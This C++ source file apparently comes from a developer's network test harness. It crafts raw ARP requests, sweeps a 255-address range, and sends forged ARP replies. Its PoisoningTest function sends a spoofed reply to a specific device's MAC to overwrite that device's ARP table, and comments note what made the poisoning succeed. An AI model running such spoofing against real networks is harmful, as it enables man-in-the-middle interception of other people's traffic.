/**============================================================================
Name        : ARPTester.cpp
Created on  : 28.12.2022.
Author      : Andrei Tokmakov
Version     : 1.0
Copyright   : Your copyright notice
Description : ARPTester
============================================================================**/

#include "ARPTester.h"

#include "../Headers/ARPHeader.h"
#include "../Headers/IPv4Header.h"
#include "../Headers/TCPHeader.h"
#include "../Headers/UDPHeader.h"

#include <net/if_arp.h>   // ARPOP_REQUEST
#include <iostream>


namespace ARPTester
{

    EthernetHeader* initEthernetHeader(EthernetHeader* ethernetHeader,
                                       const sockaddr_ll& device,
                                       std::string_view dst,
                                       const uint16_t type = ETH_P_ARP) {
        ethernetHeader->SetDestinationMACAddress(dst.data());
        ethernetHeader->SetSourceMACAddress(device.sll_addr);
        ethernetHeader->SetType(type);
        return ethernetHeader;
    }

    EthernetHeader* initEthernetHeader(EthernetHeader* ethernetHeader,
                                       std::string_view srcMAC,
                                       std::string_view dstMAC,
                                       const uint16_t type = ETH_P_ARP) {
        ethernetHeader->SetDestinationMACAddress(dstMAC.data());
        ethernetHeader->SetSourceMACAddress(srcMAC.data());
        ethernetHeader->SetType(type);
        return ethernetHeader;
    }

    /*
    ARPHeader* initARPHeader(ARPHeader* arpHeader,
                             std::string_view sourceMac)
    {
        memset(arpHeader, 0, sizeof(ARPHeader));
        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
        arpHeader->opcode = htons(ARPOP_REQUEST);  // OpCode: 1 for ARP request

        // Sender hardware address (48 bits): MAC address
        // memcpy(&arpHeader.sender_mac, device.sll_addr, 6 * sizeof (uint8_t));
        arpHeader->SetSenderMACAddress(sourceMac);

        // Target hardware address (48 bits): zero, since we don't know it yet.
        memset(&arpHeader->target_mac, 0,       6 * sizeof (uint8_t));

        return arpHeader;
    }
    */

    ARPHeader* initARPHeader_Request(ARPHeader* arpHeader,
                                     const sockaddr_ll& device)
    {
        memset(arpHeader, 0, sizeof(ARPHeader));
        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
        arpHeader->opcode = htons(ARPOP_REQUEST);  // OpCode: 1 for ARP request

        /** Sender hardware address (48 bits): MAC address **/
        arpHeader->SetSenderMACAddress(device.sll_addr);

        return arpHeader;
    }

    ARPHeader* initARPHeader_Reply(ARPHeader* arpHeader,
                                   [[maybe_unused]] const sockaddr_ll& device,
                                   std::string_view targetMac)
    {
        memset(arpHeader, 0, sizeof(ARPHeader));
        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
        arpHeader->opcode = htons(ARPOP_REPLY);    // OpCode: 1 for ARP request

        // This MAC will be used as the TARGET mac in re reply
        // Tcpdump: Reply 192.168.57.54 is-at [targetMac]
        arpHeader->SetSenderMACAddress(targetMac);
        // arpHeader->SetTargetMACAddress(targetMac);

        return arpHeader;
    }

    ARPHeader* initARPHeader_Reply(ARPHeader* arpHeader,
                                   std::string_view senderMac,
                                   std::string_view targetMac)
    {
        memset(arpHeader, 0, sizeof(ARPHeader));
        arpHeader->htype = htons(1);               // Hardware type (16 bits): 1 for ethernet
        arpHeader->ptype = htons(ETH_P_IP);        // Protocol type (16 bits): 2048 for IP
        arpHeader->hlen = 6;                       // Hardware address length (8 bits): 6 bytes for MAC address
        arpHeader->plen = 4;                       // Protocol address length (8 bits): 4 bytes for IPv4 address
        arpHeader->opcode = htons(ARPOP_REPLY);    // OpCode: 1 for ARP request

        arpHeader->SetSenderMACAddress(senderMac);
        arpHeader->SetTargetMACAddress(targetMac);

        return arpHeader;
    }

    // TODO: SocketScoped ----> Socket ???
    // FIXME: We need to use SocketScoped in the right way. or follow the rule of 5 ??
    Utilities::SocketScoped createSocket()
    {
        Utilities::SocketScoped socket = ::socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (-1 == socket) {
            std::cerr << "Failed to create socket. Error = " << errno << std::endl;
            std::exit(0);
        }
        return socket;
    }

    void enableBroadcast(Utilities::SocketScoped& sock)
    {
        uint32_t broadcastEnable { 1 };
        int32_t ret = setsockopt(sock, SOL_SOCKET, SO_BROADCAST,
                                 &broadcastEnable, sizeof(broadcastEnable));
        if (-1 == ret) {
            std::cerr << "Failed to enable broadcast on socket (" << sock << ", Error = " << errno << std::endl;
            std::exit(0);
        }
    }
}

namespace ARPTester::Tests
{

#define ON_WORK true
#ifdef ON_WORK
    constexpr std::string_view interfaceName { "enp2s0" };
    constexpr std::string_view interfaceIP { "192.168.100.0" };
#elif
    constexpr std::string_view interfaceName { "wlp4s0" };
    constexpr std::string_view interfaceIP { "192.168.0.184" };
#endif

    constexpr std::string_view BROADCAST_MAC { "ff:ff:ff:ff:ff:ff"};

    // Comms_Sleeve: wlp1s0 --> 00:30:1a:4f:8d:c4
    constexpr std::string_view cmsIfaceMac { "00:30:1a:4f:8d:c4" };
    // Comms_Sleeve: wlan1 --> e4:5f:01:61:5b:fc
    constexpr std::string_view cms_wlan1_Mac { "e4:5f:01:61:5b:fc" };

    void TestSocket()
    {
        Utilities::SocketScoped socket = createSocket();
    }

    void SendRequest()
    {
        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};

        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,BROADCAST_MAC);

        /** To send request directly to Comms_Sleeve IP **/
        // initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,
        //                    cms_wlan1_Mac);

        ARPHeader* arpHeader = initARPHeader_Request(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
                                                     device);

        // IP where replay packet shall be sent back
        arpHeader->SetSenderAddress(interfaceIP);

        // The MAC addr for this IP we want to find out: Gateway in the TII office
        // arpHeader->SetTargetAddress("192.168.57.1");

        // The MAC addr for this IP we want to find out: CommsSleeve IP address
        arpHeader->SetTargetAddress("192.168.100.82");

        Utilities::SocketScoped socket = createSocket();
        enableBroadcast(socket);

        for (int i = 0; i < 1; ++i) {

            long bytes = sendto(socket,
                                reinterpret_cast<uint8_t *>(&packet),
                                sizeof(packet),
                                0,
                                reinterpret_cast<sockaddr *>(&device),
                                sizeof(device)
            );
            if (-1 == bytes) {
                std::cerr << "Error sending packet: " << errno << std::endl;
            } else {
                std::cout << bytes << " send\n";
            }
        }
    }

    void ARP_ScanRange()
    {
        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
        Utilities::SocketScoped socket = createSocket();
        enableBroadcast(socket);

        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};
        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,BROADCAST_MAC);

        for (int i = 0; i < 255; ++i)
        {
            ARPHeader* arpHeader = initARPHeader_Request(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
                                                         device);
            arpHeader->SetSenderAddress(interfaceIP);   // Our IP: IP where replay packet shall be sent back
            arpHeader->SetTargetAddress(htonl(3232250122 + i)); // The MAC addr for this IP we want to find out

            long bytes = sendto(socket,
                                reinterpret_cast<uint8_t*>(&packet),sizeof(packet),0,
                                reinterpret_cast<sockaddr*>(&device),sizeof(device));
            if (-1 == bytes) {
                std::cerr << "Error sending packet: " << errno << std::endl;
            } else {
                std::cout << bytes << " send\n";
            }


            //std::cout << Utilities::IpToStr(3232235776) << std::endl;
        }
    }

    void SendReply()
    {
        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};

        // initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device, BROADCAST_MAC);

        /** To send request directly to Comms_Sleeve IP **/
        // initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,cms_wlan1_Mac);
        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,"bc:6e:e2:03:74:ba");

        ARPHeader* arpHeader = initARPHeader_Reply(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
                                                   "7e:f3:00:31:60:8e",  // MAC of IP requested IP in REQUEST
                                                   "bc:6e:e2:03:74:ba"); // MAC of 'Sender IP Address' from Request


        // IP address for which the MAC has been requested in the Request ARP packet
        // arpHeader->SetSenderAddress(interfaceIP);
        arpHeader->SetSenderAddress("192.168.1.5");

        // IP of the one WHO asked to resolve IP in corresponding Request ARP packet
        // 'Target IP Address' in Repl shall be equal 'Sender IP Address' from Request
        arpHeader->SetTargetAddress("192.168.57.54");

        Utilities::SocketScoped socket = createSocket();
        enableBroadcast(socket);

        for (int i = 0; i < 1; ++i) {

            long bytes = sendto(socket,
                                reinterpret_cast<uint8_t *>(&packet),
                                sizeof(packet),
                                0,
                                reinterpret_cast<sockaddr *>(&device),
                                sizeof(device)
            );
            if (-1 == bytes) {
                std::cerr << "Error sending packet: " << errno << std::endl;
            } else {
                std::cout << bytes << " send\n";
            }
        }
    }


    void PoisoningTest()
    {
        sockaddr_ll device = Utilities::ResolveInterfaceAddress(interfaceName);
        uint8_t packet[sizeof(EthernetHeader) + sizeof(ARPHeader)] {};

        // Have to send ARP Reply packet right to Comms_Sleeve interface MAC address
        // otherwise it fail to set new value to the ARP table
        initEthernetHeader(reinterpret_cast<EthernetHeader*>(packet), device,
                           cms_wlan1_Mac); /** To send request directly to Comms_Sleeve IP **/

        // Target MAC address: doesn't matter in case when we want to overwrite the ARP table value
        // or at least it looks like it
        // 'Sender IP Address' ---> It the POISONED MAC address
        ARPHeader* arpHeader = initARPHeader_Reply(reinterpret_cast<ARPHeader*>((packet + sizeof(EthernetHeader))),
                                                   "22:22:22:22:33:33",  // MAC of IP requested IP in REQUEST
                                                   BROADCAST_MAC); // MAC of 'Sender IP Address' from Request

        // IP address for which the MAC has been requested in the Request ARP packet
        arpHeader->SetSenderAddress("192.168.57.56");

        // IP of the one WHO asked to resolve IP in corresponding Request ARP packet
        // 'Target IP Address' in Repl shall be equal 'Sender IP Address' from Request
        //
        // In case of ARP Poisoning: --> Looks like doesn't matter
        // BUT: poisoning fails with 'Target IP Address' == "127.0.0.1

        arpHeader->SetTargetAddress("192.168.1.6");
        // arpHeader->SetTargetAddress("127.0.0.1");

        Utilities::SocketScoped socket = createSocket();
        enableBroadcast(socket);

        long bytes = sendto(socket,reinterpret_cast<uint8_t *>(&packet),sizeof(packet),
                            0,reinterpret_cast<sockaddr *>(&device),sizeof(device));
        if (-1 == bytes) {
            std::cerr << "Error sending packet: " << errno << std::endl;
        } else {
            std::cout << bytes << " send\n";
        }
    }
}

/**
Request:  Broadcast    Who has 192.168.57.1? Tell 192.168.57.54

    Address Resolution Protocol (request)
        Hardware type: Ethernet (1)
        Protocol type: IPv4 (0x0800)
        Hardware size: 6
        Protocol size: 4
        Opcode: request (1)
        Sender MAC address: IntelCor_03:74:ba (bc:6e:e2:03:74:ba)
        Sender IP address: 192.168.57.54
        Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)
        Target IP address: 192.168.57.1

Reply:  192.168.57.1 is at e8:eb:34:bf:80:2f

    Address Resolution Protocol (reply)
        Hardware type: Ethernet (1)
        Protocol type: IPv4 (0x0800)
        Hardware size: 6
        Protocol size: 4
        Opcode: reply (2)
        Sender MAC address: Cisco_bf:80:2f (e8:eb:34:bf:80:2f)
        Sender IP address: 192.168.57.1
        Target MAC address: IntelCor_03:74:ba (bc:6e:e2:03:74:ba)
        Target IP address: 192.168.57.54
**/

void ARPTester::TestAll()
{
    Utilities::checkRunningUnderRoot();

    // Tests::TestSocket();
    Tests::SendRequest();
    // Tests::ARP_ScanRange();
    // Tests::SendReply();
    // Tests::PoisoningTest();

    // std::cout << sizeof(ARPHeader) << std::endl;

}